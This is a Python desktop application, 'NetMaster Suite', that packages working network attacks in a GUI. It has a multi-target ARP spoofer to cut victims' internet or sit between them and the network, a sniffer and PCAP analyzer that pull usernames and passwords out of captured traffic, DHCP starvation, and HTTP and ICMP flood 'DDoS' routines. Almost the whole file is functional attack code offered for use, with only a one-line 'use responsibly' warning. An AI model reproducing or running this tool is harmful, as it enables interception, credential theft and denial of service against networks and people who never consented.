import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading
import time
import socket
import platform
import subprocess
import requests
import os
import json
import logging
import re
import queue  # Import the queue module
from collections import Counter, defaultdict
import webbrowser

try:
    from scapy.all import ARP, Ether, srp, send, sniff, sendp, RandMAC, IP, TCP, UDP, ICMP
    from scapy.layers.http import HTTPRequest, HTTPResponse
    from scapy.utils import PcapWriter, rdpcap
except ImportError:
    messagebox.showerror("Dependency Error", "Scapy is not installed. Please run 'pip install scapy'")
    exit()

try:
    import nmap  # Import python-nmap
except ImportError:
    messagebox.showerror("Dependency Error", "python-nmap is not installed. Please run 'pip install python-nmap'")
    exit()

try:
    import matplotlib.pyplot as plt
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
except ImportError:
    messagebox.showerror("Dependency Error", "matplotlib is not installed. Please run 'pip install matplotlib'")
    exit()

# Konfigurasi Scapy untuk menggunakan Npcap
import scapy.config
scapy.config.conf.use_pcap = True
scapy.config.conf.use_npcap = True

# --- Logging Configuration ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class NetMasterSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("NetMaster Suite - Advanced Network Tool")
        self.root.geometry("1400x900")  # Increased window size
        self.root.configure(bg="#252526") # Darker background

        # Attack state flags
        self.spoofing_active = False
        self.sniffing_active = False
        self.dhcp_starve_active = False
        self.ddos_active = False
        self.spoof_threads = []  # List to store multiple spoof threads
        self.sniff_thread = None
        self.dhcp_thread = None
        self.ddos_thread = None
        self.icmp_flood_thread = None

        # Sniffing parameters
        self.packet_count = 0
        self.pcap_writer = None
        self.sniff_filter = ""  # Default filter (all traffic)
        self.capture_file = "capture.pcap"
        self.packet_queue = queue.Queue()  # Queue for processing packets
        self.analyzed_data = defaultdict(list) # Structure data

        # Data storage
        self.device_data = []  # Store device info from discovery

        self.setup_styles()
        self.create_widgets()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam') # Updated theme for better contrast
        # Main background
        style.configure(".", background="#252526", foreground="#d0d0d0", fieldbackground="#3c3c3c", bordercolor="#555") # Darker colors
        # Notebook style
        style.configure("TNotebook", background="#252526", borderwidth=1)
        style.configure("TNotebook.Tab", background="#333333", foreground="#d0d0d0", padding=[12, 5], font=('Segoe UI', 10))
        style.map("TNotebook.Tab", background=[("selected", "#007acc")], foreground=[("selected", "white")])
        # Frame and Label
        style.configure("TFrame", background="#252526")
        style.configure("TLabel", background="#252526", foreground="#d0d0d0", font=('Segoe UI', 10))
        style.configure("Header.TLabel", font=('Segoe UI', 16, 'bold'), foreground="#ffffff")  # White header
        # Button style
        style.configure("TButton", padding=6, font=('Segoe UI', 10, 'bold'), background="#444444", foreground="#d0d0d0") # Muted button color
        style.map("TButton", background=[('active', '#666666')])
        # Entry style
        style.configure("TEntry", foreground="#d0d0d0", insertbackground="white", fieldbackground="#3c3c3c")

    def create_widgets(self):
        header = ttk.Label(self.root, text="NetMaster Suite", style="Header.TLabel")
        header.pack(pady=10)

        notebook = ttk.Notebook(self.root)
        notebook.pack(expand=True, fill='both', padx=10, pady=10)

        # Create tabs
        self.tab_discover = ttk.Frame(notebook)
        self.tab_spoofer = ttk.Frame(notebook)
        self.tab_sniffer = ttk.Frame(notebook)
        self.tab_attacks = ttk.Frame(notebook)
        self.tab_pcap_analyzer = ttk.Frame(notebook)

        notebook.add(self.tab_discover, text='Device Discovery')
        notebook.add(self.tab_spoofer, text='ARP Spoofer (NetCut)')
        notebook.add(self.tab_sniffer, text='Packet Sniffer')
        notebook.add(self.tab_attacks, text='Advanced Attacks')
        notebook.add(self.tab_pcap_analyzer, text='PCAP Analyzer')  # New Tab

        # Populate tabs
        self.create_discover_tab()
        self.create_spoofer_tab()
        self.create_sniffer_tab()
        self.create_attacks_tab()
        self.create_pcap_analyzer_tab()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def log(self, text_widget, message):
        """Logs a message to the specified ScrolledText widget."""
        text_widget.configure(state='normal')
        text_widget.insert(tk.END, message + '\n')
        text_widget.configure(state='disabled')
        text_widget.see(tk.END)
        self.root.update_idletasks()

    # --- Device Discovery Tab ---
    def create_discover_tab(self):
        frame = ttk.Frame(self.tab_discover, padding="10")
        frame.pack(fill='both', expand=True)

        ttk.Button(frame, text="Scan Devices on Network", command=self.start_discover_devices).pack(fill='x', pady=5)

        self.discover_output = scrolledtext.ScrolledText(frame, bg="#303030", fg="#00ff00", font=("Consolas", 10),
                                                           state='disabled')
        self.discover_output.pack(fill='both', expand=True, pady=5)

        # Save Data Button
        ttk.Button(frame, text="Save Device Data", command=self.save_device_data).pack(fill='x', pady=5)

    def start_discover_devices(self):
        self.log(self.discover_output, "[*] Starting network scan... This may take a moment.")
        threading.Thread(target=self.discover_devices, daemon=True).start()

    def discover_devices(self):
        try:
            gateway_ip = self.get_gateway_ip()
            if not gateway_ip:
                self.log(self.discover_output, "[!] Could not determine gateway IP. Scan aborted.")
                return

            self.log(self.discover_output, f"[*] Gateway found: {gateway_ip}. Scanning subnet...")
            target_ip = f"{gateway_ip.rsplit('.', 1)[0]}.0/24"

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)

            result = srp(arp_request, timeout=3, verbose=False)[0]

            self.device_data = []  # Reset data
            for sent, received in result:
                ip = received.psrc
                mac = received.hwsrc
                vendor = self.get_mac_vendor(mac)
                device = {'ip': ip, 'mac': mac, 'vendor': vendor}
                self.device_data.append(device)

            self.log(self.discover_output, "\n--- Scan Complete ---")
            self.log(self.discover_output,
                     f"{'IP Address':<18} {'MAC Address':<20} {'Vendor':<25}")
            self.log(self.discover_output, "-" * 65)
            for device in self.device_data:
                self.log(self.discover_output,
                         f"{device['ip']:<18} {device['mac']:<20} {device['vendor']:<25}")
            self.log(self.discover_output, "--- End of List ---\n")

        except Exception as e:
            self.log(self.discover_output, f"[!] An error occurred during scan: {e}")
            logging.exception("Error during device discovery")


    def save_device_data(self):
        if not self.device_data:
            messagebox.showinfo("Info", "No device data to save.")
            return

        try:
            filename = simpledialog.askstring("Save As", "Enter filename for the JSON data:")
            if filename:
                if not filename.endswith(".json"):
                    filename += ".json"
                with open(filename, 'w') as f:
                    json.dump(self.device_data, f, indent=4)
                messagebox.showinfo("Success", f"Device data saved to {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Error saving data: {e}")
            logging.exception("Error saving device data")

    def get_mac_vendor(self, mac_address):
        try:
            response = requests.get(f"https://api.macvendors.com/{mac_address}", timeout=2)
            if response.status_code == 200:
                return response.text
            else:
                return "Unknown"
        except requests.RequestException:
            return "N/A (API Error)"

    # --- ARP Spoofer (NetCut) Tab ---
    def create_spoofer_tab(self):
        frame = ttk.Frame(self.tab_spoofer, padding="10")
        frame.pack(fill='both', expand=True)

        ttk.Label(frame, text="WARNING: Use this tool responsibly on your own network.").pack(fill='x', pady=5)

        # Input Frame
        input_frame = ttk.Frame(frame)
        input_frame.pack(fill='x', pady=5)

        # Multiple IP entry fields
        self.target_ip_entries = []
        for i in range(3):  # Create 3 input fields for target IPs
            ip_frame = ttk.Frame(input_frame)
            ip_frame.pack(fill='x', pady=2)
            ttk.Label(ip_frame, text=f"Target IP {i+1}:").pack(side='left', padx=5)
            ip_entry = ttk.Entry(ip_frame)
            ip_entry.pack(side='left', fill='x', expand=True, padx=5)
            self.target_ip_entries.append(ip_entry)

        ttk.Label(input_frame, text="Gateway IP:").pack(side='left', padx=5)
        self.gateway_ip_entry = ttk.Entry(input_frame)
        self.gateway_ip_entry.pack(side='left', fill='x', expand=True, padx=5)

        # Auto-fill gateway
        gateway = self.get_gateway_ip()
        if gateway:
            self.gateway_ip_entry.insert(0, gateway)

        # Buttons Frame
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill='x', pady=5)
        self.start_spoof_btn = ttk.Button(btn_frame, text="Start Attack (Cut Internet)", command=self.start_spoof)
        self.start_spoof_btn.pack(side='left', fill='x', expand=True, padx=5)

        self.stop_spoof_btn = ttk.Button(btn_frame, text="Stop Attack & Restore Network", command=self.stop_spoof,
                                           state='disabled')
        self.stop_spoof_btn.pack(side='left', fill='x', expand=True, padx=5)

        self.spoofer_output = scrolledtext.ScrolledText(frame, bg="#303030", fg="red", font=("Consolas", 10),
                                                            state='disabled')
        self.spoofer_output.pack(fill='both', expand=True, pady=5)

    def start_spoof(self):
        target_ips = []
        for entry in self.target_ip_entries:
            ip = entry.get().strip()
            if ip:  # Only add if not empty
                target_ips.append(ip)

        gateway_ip = self.gateway_ip_entry.get()

        if not target_ips or not gateway_ip:
            messagebox.showwarning("Input Error", "Please provide Target IPs and Gateway IP.")
            return

        if not self.validate_ips(target_ips):
            messagebox.showwarning("Input Error", "Invalid IP address(es).")
            return

        self.spoofing_active = True
        self.start_spoof_btn.config(state='disabled')
        self.stop_spoof_btn.config(state='normal')
        self.spoof_threads = []  # Clear any previous threads

        self.log(self.spoofer_output, f"[*] Starting ARP spoof attack on {len(target_ips)} targets...")

        for target_ip in target_ips:
            thread = threading.Thread(target=self.arp_spoof_loop, args=(target_ip, gateway_ip), daemon=True)
            self.spoof_threads.append(thread)
            thread.start()
            self.log(self.spoofer_output, f"[*] Started spoofing thread for {target_ip}")

    def stop_spoof(self):
        self.spoofing_active = False
        if self.spoof_threads:
            self.log(self.spoofer_output, "[*] Stopping all attacks and restoring network...")
            # Allow threads to finish
            time.sleep(2.5)

            target_ips = []
            for entry in self.target_ip_entries:
                ip = entry.get().strip()
                if ip:  # Only add if not empty
                    target_ips.append(ip)

            gateway_ip = self.gateway_ip_entry.get()

            for target_ip in target_ips:
                self.restore_network(target_ip, gateway_ip)  # Restore each target

            self.log(self.spoofer_output, "[+] Network should be restored for all targets.")

        self.start_spoof_btn.config(state='normal')
        self.stop_spoof_btn.config(state='disabled')

    def validate_ips(self, ip_list):
        """Validates a list of IP addresses using regex."""
        pattern = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
        for ip in ip_list:
            if not re.match(pattern, ip):
                return False
        return True

    def arp_spoof_loop(self, target_ip, gateway_ip):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            if not target_mac or not gateway_mac:
                self.log(self.spoofer_output,
                         f"[!] Could not get MAC address for {target_ip} or {gateway_ip}. Aborting for this target.")
                return  # Stop only this thread
            while self.spoofing_active:
                self.send_spoof_packet(target_ip, gateway_ip, target_mac)  # Tell target I am gateway
                self.send_spoof_packet(gateway_ip, target_ip, gateway_mac)  # Tell gateway I am target
                time.sleep(2)
        except Exception as e:
            self.log(self.spoofer_output, f"[!] Error during spoofing: {e}")
            logging.exception("Error during ARP Spoofing")

    def send_spoof_packet(self, target_ip, spoof_ip, target_mac):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def restore_network(self, target_ip, gateway_ip):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            if not target_mac or not gateway_mac:
                self.log(self.spoofer_output,
                         "[!] Could not get MACs for restoration. Manual router reboot might be needed.")
                return

            # Send correct ARP packets multiple times to ensure they are received
            for _ in range(4):
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), verbose=False)
                time.sleep(0.5)
        except Exception as e:
            self.log(self.spoofer_output, f"[!] Error during restoration: {e}")
            logging.exception("Error during network restoration")

    # --- Packet Sniffer Tab ---
    def create_sniffer_tab(self):
        frame = ttk.Frame(self.tab_sniffer, padding="10")
        frame.pack(fill='both', expand=True)

        ttk.Label(frame, text="Sniffs ALL traffic.").pack(fill='x', pady=5)

        # Sniffer Options
        options_frame = ttk.Frame(frame)
        options_frame.pack(fill='x', pady=5)

        ttk.Label(options_frame, text="Capture File:").pack(side='left', padx=5)
        self.capture_file_entry = ttk.Entry(options_frame)
        self.capture_file_entry.insert(0, self.capture_file)
        self.capture_file_entry.pack(side='left', fill='x', expand=True, padx=5)

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill='x', pady=5)
        self.start_sniff_btn = ttk.Button(btn_frame, text="Start Sniffing", command=self.start_sniff)
        self.start_sniff_btn.pack(side='left', fill='x', expand=True, padx=5)

        self.stop_sniff_btn = ttk.Button(btn_frame, text="Stop Sniffing", command=self.stop_sniff, state='disabled')
        self.stop_sniff_btn.pack(side='left', fill='x', expand=True, padx=5)

        self.sniffer_output = scrolledtext.ScrolledText(frame, bg="#303030", fg="#00ffff", font=("Consolas", 10), # Cyan
                                                            state='disabled')
        self.sniffer_output.pack(fill='both', expand=True, pady=5)

    def start_sniff(self):
        self.sniffing_active = True
        self.start_sniff_btn.config(state='disabled')
        self.stop_sniff_btn.config(state='normal')

        self.sniff_filter = "" # Empty filter
        self.capture_file = self.capture_file_entry.get()
        self.packet_count = 0
        self.pcap_writer = PcapWriter(self.capture_file, append=False, sync=True)  # Open file for writing
        self.packet_queue = queue.Queue()  # Clear the queue before starting
        self.analyzed_data = defaultdict(list) #reset analyzed data

        self.log(self.sniffer_output,
                 f"[*] Packet sniffer started capturing ALL traffic, saving to {self.capture_file}...")
        self.sniff_thread = threading.Thread(target=self.sniff_packets, daemon=True)
        self.sniff_thread.start()

        # Start packet processing thread
        self.packet_processing_thread = threading.Thread(target=self.process_packets_from_queue, daemon=True)
        self.packet_processing_thread.start()

    def stop_sniff(self):
        self.sniffing_active = False
        self.log(self.sniffer_output, f"\n[*] Packet sniffer stopped. Captured {self.packet_count} packets.")
        self.start_sniff_btn.config(state='normal')
        self.stop_sniff_btn.config(state='disabled')

        if self.pcap_writer:
            self.pcap_writer.close()  # Close capture file
            self.pcap_writer = None

        self.display_structured_data() #Display Analysis Data

    def sniff_packets(self):
        try:
            sniff(filter=self.sniff_filter, prn=self.enqueue_packet,
                  stop_filter=lambda x: not self.sniffing_active, store=False)
        except Exception as e:
            self.log(self.sniffer_output, f"[!] Sniffing error: {e}")
            logging.exception("Sniffing error")
            self.stop_sniff()  # Ensure buttons are reset

    def enqueue_packet(self, packet):
        """Enqueues packets for processing by the packet processing thread."""
        self.packet_count += 1
        self.pcap_writer.write(packet)  # Save raw packet to pcap file
        self.packet_queue.put(packet)  # Enqueue the packet

    def process_packets_from_queue(self):
        """Processes packets from the queue."""
        while self.sniffing_active:
            try:
                packet = self.packet_queue.get(timeout=1)  # Wait for a packet with a timeout
                self.process_sniffed_packet(packet)
                self.packet_queue.task_done()
            except queue.Empty:
                pass  # No packet received within the timeout

    def process_sniffed_packet(self, packet):
        """Processes individual sniffed packets."""
        try:
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                if TCP in packet:
                    protocol = "TCP"
                    src_port = packet[TCP].sport
                    dst_port = packet[TCP].dport
                elif UDP in packet:
                    protocol = "UDP"
                    src_port = packet[UDP].sport
                    dst_port = packet[UDP].dport
                elif ICMP in packet:
                    protocol = "ICMP"
                    src_port = "N/A"
                    dst_port = "N/A"
                else:
                    protocol = "Other"
                    src_port = "N/A"
                    dst_port = "N/A"

                packet_info = {
                    "timestamp": time.time(),
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                    "protocol": protocol,
                    "src_port": src_port,
                    "dst_port": dst_port,
                    "length": len(packet)
                }

                self.analyzed_data["packets"].append(packet_info)

                if packet.haslayer(HTTPRequest):
                    try:
                        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                        method = packet[HTTPRequest].Method.decode()
                        self.analyzed_data["http_requests"].append({"url": url, "method": method})
                    except:
                        pass # Handle decode errors

                elif packet.haslayer(HTTPResponse):
                    try:
                        status_code = packet[HTTPResponse].Status_Code
                        self.analyzed_data["http_responses"].append({"status_code": status_code})
                    except:
                        pass # Handle decode errors

                # Credential Harvesting Improved
                if packet.haslayer(TCP) and packet[TCP].dport in [80, 21, 23, 110, 143, 443]:
                    try:
                        payload = bytes(packet[TCP].payload).decode(errors='ignore')
                        matches = re.findall(r"(?P<key>user|pass|login|pwd)\s*[:=]\s*(?P<value>[^\s]+)", payload, re.IGNORECASE)
                        for match in matches:
                            self.analyzed_data["potential_credentials"].append(f"{match[0]}: {match[1]}")
                    except:
                         pass # Handle decode errors

        except Exception as e:
            logging.exception("Error processing packet")
            pass

    def display_structured_data(self):
         """Displays the analyzed data in a structured format."""
         self.log(self.sniffer_output, "\n---[+]--- ANALYZED DATA ---[+]---\n")

         self.log(self.sniffer_output, "\n--- Packet Summary ---")
         self.log(self.sniffer_output, f"Total Packets: {len(self.analyzed_data['packets'])}")
         protocol_counts = Counter(p["protocol"] for p in self.analyzed_data["packets"])
         for protocol, count in protocol_counts.items():
             self.log(self.sniffer_output, f"  {protocol}: {count}")

         self.log(self.sniffer_output, "\n--- HTTP Requests ---")
         for req in self.analyzed_data["http_requests"]:
             self.log(self.sniffer_output, f"  {req['method']} {req['url']}")

         self.log(self.sniffer_output, "\n--- HTTP Responses ---")
         for resp in self.analyzed_data["http_responses"]:
             self.log(self.sniffer_output, f"  Status Code: {resp['status_code']}")

         self.log(self.sniffer_output, "\n--- Potential Credentials ---")
         if self.analyzed_data["potential_credentials"]:
              for cred in self.analyzed_data["potential_credentials"]:
                   self.log(self.sniffer_output, f"   {cred}")
         else:
              self.log(self.sniffer_output, "  No potential credentials found.")

         # Traffic analysis visualization (Destination IPs)
         self.create_traffic_visualization()

         self.log(self.sniffer_output, "\n---[+]--- End of ANALYZED DATA ---[+]---\n")

    def create_traffic_visualization(self):
        """Creates traffic volume visualization based on destination IP addresses."""
        dest_ip_counts = Counter(p["dst_ip"] for p in self.analyzed_data["packets"] if "dst_ip" in p)

        top_ips = dest_ip_counts.most_common(10)  # Top 10 destination IPs

        if top_ips:
            labels, values = zip(*top_ips)
            fig, ax = plt.subplots(figsize=(10, 6))
            ax.bar(labels, values)
            ax.set_xlabel("Destination IP Address")
            ax.set_ylabel("Packet Count")
            ax.set_title("Top 10 Destination IP Addresses")
            ax.tick_params(axis='x', rotation=45)  # Rotate x-axis labels

            # Embed matplotlib figure in Tkinter window
            canvas = FigureCanvasTkAgg(fig, master=self.root)  # Use master=self.root for main window
            canvas_widget = canvas.get_tk_widget()

            # Create a new Toplevel window for the visualization
            visualization_window = tk.Toplevel(self.root)
            visualization_window.title("Traffic Visualization")
            canvas_widget.pack(side=tk.TOP, fill=tk.BOTH, expand=1)
            canvas.draw()
        else:
            self.log(self.sniffer_output, "\n--- Traffic Visualization: No data to visualize ---\n")

    # --- Advanced Attacks Tab ---
    def create_attacks_tab(self):
        frame = ttk.Frame(self.tab_attacks, padding="10")
        frame.pack(fill='both', expand=True)

        ttk.Label(frame, text="DANGER ZONE: These attacks can bring down a network.", foreground="orange").pack(
            fill='x', pady=10)

        self.dhcp_btn = ttk.Button(frame, text="Start DHCP Starvation Attack", command=self.toggle_dhcp_starve)
        self.dhcp_btn.pack(fill='x', pady=5)

        self.ddos_btn = ttk.Button(frame, text="Start HTTP Flood DDoS", command=self.toggle_ddos)
        self.ddos_btn.pack(fill='x', pady=5)

        self.icmp_flood_btn = ttk.Button(frame, text="Start ICMP Flood (Ping Flood)", command=self.toggle_icmp_flood)
        self.icmp_flood_btn.pack(fill='x', pady=5)

        self.attacks_output = scrolledtext.ScrolledText(frame, bg="#303030", fg="#ff4444", font=("Consolas", 10),
                                                           state='disabled')
        self.attacks_output.pack(fill='both', expand=True, pady=5)

    def toggle_dhcp_starve(self):
        if not self.dhcp_starve_active:
            self.dhcp_starve_active = True
            self.dhcp_btn.config(text="Stop DHCP Starvation Attack")
            self.log(self.attacks_output, "[!] Starting DHCP Starvation... This will flood the router with fake requests.")
            self.dhcp_thread = threading.Thread(target=self.dhcp_starve, daemon=True)
            self.dhcp_thread.start()
        else:
            self.dhcp_starve_active = False
            self.dhcp_btn.config(text="Start DHCP Starvation Attack")
            self.log(self.attacks_output, "[+] DHCP Starvation attack stopped.")

    def dhcp_starve(self):
        from scapy.layers.dhcp import DHCP, BOOTP
        from scapy.layers.inet import IP, UDP

        while self.dhcp_starve_active:
            # Create a DHCP discover packet with a random MAC address
            dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
                            BOOTP(chaddr=RandMAC()) / \
                            DHCP(options=[("message-type", "discover"), "end"])

            sendp(dhcp_discover, verbose=False)
            self.log(self.attacks_output, f"[*] Sent DHCP Discover from fake MAC: {dhcp_discover.src}")
            time.sleep(0.2)

    def toggle_ddos(self):
        if not self.ddos_active:
            self.ddos_active = True
            self.ddos_btn.config(text="Stop HTTP Flood DDoS")
            target = simpledialog.askstring("DDoS Target", "Enter target URL (e.g., http://example.com):")
            if target:
                self.log(self.attacks_output, f"[!] Starting HTTP Flood DDoS on {target}...")
                self.ddos_thread = threading.Thread(target=self.http_flood_ddos, args=(target,), daemon=True)
                self.ddos_thread.start()
            else:
                self.ddos_active = False  # Cancelled
                self.ddos_btn.config(text="Start HTTP Flood DDoS")
                self.log(self.attacks_output, "[!] DDoS target not specified, attack cancelled.")
        else:
            self.ddos_active = False
            self.ddos_btn.config(text="Start HTTP Flood DDoS")
            self.log(self.attacks_output, "[+] HTTP Flood DDoS attack stopped.")

    def http_flood_ddos(self, target_url):
        try:
            while self.ddos_active:
                try:
                    response = requests.get(target_url, timeout=5)
                    self.log(self.attacks_output, f"[*] Sent HTTP request to {target_url}, Status Code: {response.status_code}")
                except requests.RequestException as e:
                    self.log(self.attacks_output, f"[!] HTTP request failed: {e}")
                time.sleep(0.1)  # Adjust sleep time to control intensity
        except Exception as e:
            self.log(self.attacks_output, f"[!] DDoS attack error: {e}")
            logging.exception("DDoS attack error")

    def toggle_icmp_flood(self):
        if not self.icmp_flood_active:
            self.icmp_flood_active = True
            self.icmp_flood_btn.config(text="Stop ICMP Flood (Ping Flood)")
            target_ip = simpledialog.askstring("ICMP Flood Target", "Enter target IP address:")
            if target_ip:
                if self.validate_ips([target_ip]):
                     self.log(self.attacks_output, f"[!] Starting ICMP Flood on {target_ip}...")
                     self.icmp_flood_thread = threading.Thread(target=self.icmp_flood, args=(target_ip,), daemon=True)
                     self.icmp_flood_thread.start()
                else:
                    self.icmp_flood_active = False
                    self.icmp_flood_btn.config(text="Start ICMP Flood (Ping Flood)")
                    self.log(self.attacks_output, "[!] Invalid IP address.")
            else:
                self.icmp_flood_active = False
                self.icmp_flood_btn.config(text="Start ICMP Flood (Ping Flood)")
                self.log(self.attacks_output, "[!] Target IP not specified, attack cancelled.")
        else:
            self.icmp_flood_active = False
            self.icmp_flood_btn.config(text="Start ICMP Flood (Ping Flood)")
            self.log(self.attacks_output, "[+] ICMP Flood attack stopped.")

    def icmp_flood(self, target_ip):
        try:
            while self.icmp_flood_active:
                icmp_packet = IP(dst=target_ip) / ICMP() / b"NetMasterSuite Flood"
                send(icmp_packet, verbose=False)
                self.log(self.attacks_output, f"[*] Sent ICMP packet to {target_ip}")
                time.sleep(0.1)  # Adjust sleep time to control intensity
        except Exception as e:
            self.log(self.attacks_output, f"[!] ICMP Flood error: {e}")
            logging.exception("ICMP Flood error")

    # --- PCAP Analyzer Tab ---
    def create_pcap_analyzer_tab(self):
        frame = ttk.Frame(self.tab_pcap_analyzer, padding="10")
        frame.pack(fill='both', expand=True)

        ttk.Label(frame, text="Analyze PCAP files for network insights.").pack(fill='x', pady=5)

        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill='x', pady=5)

        self.load_pcap_btn = ttk.Button(btn_frame, text="Load PCAP File", command=self.load_pcap_file)
        self.load_pcap_btn.pack(side='left', fill='x', expand=True, padx=5)

        self.pcap_output = scrolledtext.ScrolledText(frame, bg="#303030", fg="#d0d0d0", font=("Consolas", 10),
                                                       state='disabled')
        self.pcap_output.pack(fill='both', expand=True, pady=5)

    def load_pcap_file(self):
        filename = filedialog.askopenfilename(title="Select PCAP File", filetypes=(("PCAP files", "*.pcap"), ("all files", "*.*")))
        if filename:
            self.log(self.pcap_output, f"[*] Loading PCAP file: {filename}...")
            threading.Thread(target=self.analyze_pcap, args=(filename,), daemon=True).start()

    def analyze_pcap(self, filename):
        try:
            packets = rdpcap(filename)
            self.log(self.pcap_output, f"[*] Successfully read {len(packets)} packets.")

            # Collect data for analysis
            protocol_counts = Counter()
            ip_pairs = Counter()
            http_urls = []
            potential_creds = []
            tls_versions = Counter()

            for packet in packets:
                # Protocol Counts
                if TCP in packet:
                    protocol_counts["TCP"] += 1
                elif UDP in packet:
                    protocol_counts["UDP"] += 1
                elif ICMP in packet:
                    protocol_counts["ICMP"] += 1
                else:
                    protocol_counts["Other"] += 1

                # IP Pairs
                if IP in packet:
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    ip_pairs[(src_ip, dst_ip)] += 1

                # HTTP Analysis
                if packet.haslayer(HTTPRequest):
                    try:
                        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                        http_urls.append(url)
                    except:
                        pass  # Handle decode errors

                # TLS Version Detection
                if TCP in packet and packet.dport == 443 or packet.sport == 443:
                    if Raw in packet:
                        try:
                            raw_data = packet[Raw].load
                            if raw_data[0] == 0x16 and raw_data[5] == 0x01:  # TLS handshake
                                tls_version = f"TLS 1.{raw_data[11]}"  # Assuming TLS 1.x
                                tls_versions[tls_version] += 1
                        except:
                            pass # Handle decode errors


                # Potential Credentials
                if TCP in packet and packet[TCP].dport in [80, 21, 23, 110, 143, 443]:
                    try:
                        payload = bytes(packet[TCP].payload).decode(errors='ignore')
                        matches = re.findall(r"(?P<key>user|pass|login|pwd)\s*[:=]\s*(?P<value>[^\s]+)", payload, re.IGNORECASE)
                        for match in matches:
                            potential_creds.append(f"{match[0]}: {match[1]}")
                    except:
                         pass # Handle decode errors

            # --- Output in Structured Format ---
            output = "\n--- PCAP Analysis Report ---\n\n"

            output += "--- Protocol Summary ---\n"
            for protocol, count in protocol_counts.items():
                output += f"{protocol}: {count} packets\n"
            output += "\n"

            output += "--- Top 10 IP Conversations ---\n"
            for (src_ip, dst_ip), count in ip_pairs.most_common(10):
                output += f"({src_ip} <-> {dst_ip}): {count} packets\n"
            output += "\n"

            output += "--- Unique HTTP URLs ---\n"
            unique_urls = list(set(http_urls))  # Remove duplicates
            for url in unique_urls:
                output += f"{url}\n"
            output += "\n"

            output += "--- Potential Credentials ---\n"
            if potential_creds:
                for cred in potential_creds:
                    output += f"{cred[:150]}...\n" # Shorten even more for output
            else:
                output += "No potential credentials found.\n"
            output += "\n"

            output += "--- TLS Version Summary ---\n"
            if tls_versions:
                for version, count in tls_versions.items():
                    output += f"{version}: {count} packets\n"
            else:
                output += "No TLS traffic detected.\n"
            output += "\n"

            output += "--- End of Report ---\n"

            self.log(self.pcap_output, output)

        except Exception as e:
            self.log(self.pcap_output, f"[!] Error analyzing PCAP: {e}")
            logging.exception("Error analyzing PCAP")

    # --- Helper & Utility Functions ---
    def get_gateway_ip(self):
        """Gets the default gateway IP for the current system."""
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("route print -4 0.0.0.0", shell=True).decode()
                for line in output.splitlines():
                    if "0.0.0.0" in line and "On-link" not in line:
                        parts = line.split()
                        if len(parts) > 3:
                            return parts[2]
            else:  # Linux/macOS
                output = subprocess.check_output("ip route | grep default", shell=True).decode()
                return output.split()[2]
        except Exception as e:
            logging.error(f"Error getting gateway IP: {e}")
            return None

    def get_mac(self, ip_address):
        """Gets the MAC address for a given IP."""
        try:
            response, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, verbose=False)
            if response:
                return response[0][1].hwsrc
        except Exception as e:
            logging.error(f"Error getting MAC address for {ip_address}: {e}")
            return None
        return None

    def validate_ips(self, ip_list):
        """Validates a list of IP addresses using regex."""
        pattern = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
        for ip in ip_list:
            if not re.match(pattern, ip):
                return False
        return True

    def on_closing(self):
        """Handle the window closing event."""
        if messagebox.askokcancel("Quit", "Do you want to exit? This will stop all ongoing attacks."):
            # Stop all attack threads before closing
            self.spoofing_active = False
            self.sniffing_active = False
            self.dhcp_starve_active = False
            self.ddos_active = False
            self.icmp_flood_active = False

            # If spoofing was active, try to restore the network
            target_ips = []
            for entry in self.target_ip_entries:
                ip = entry.get().strip()
                if ip:  # Only add if not empty
                    target_ips.append(ip)

            gateway_ip = self.gateway_ip_entry.get()

            if target_ips and gateway_ip:
                print("Attempting final network restoration...")
                for target_ip in target_ips:
                    self.restore_network(target_ip, self.gateway_ip_entry.get())  # Restore each target
                print("Restoration packets sent.")

            self.root.destroy()


if __name__ == "__main__":
    if platform.system() != "Windows":
        if os.geteuid() != 0:
            messagebox.showerror("Permission Error", "This script must be run as root/administrator to function correctly.")
            exit()
    else:  # Windows
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin() != 1:
            messagebox.showerror("Permission Error", "This script must be run as administrator on Windows.")
            exit()

    root = tk.Tk()
    app = NetMasterSuite(root)
    root.mainloop()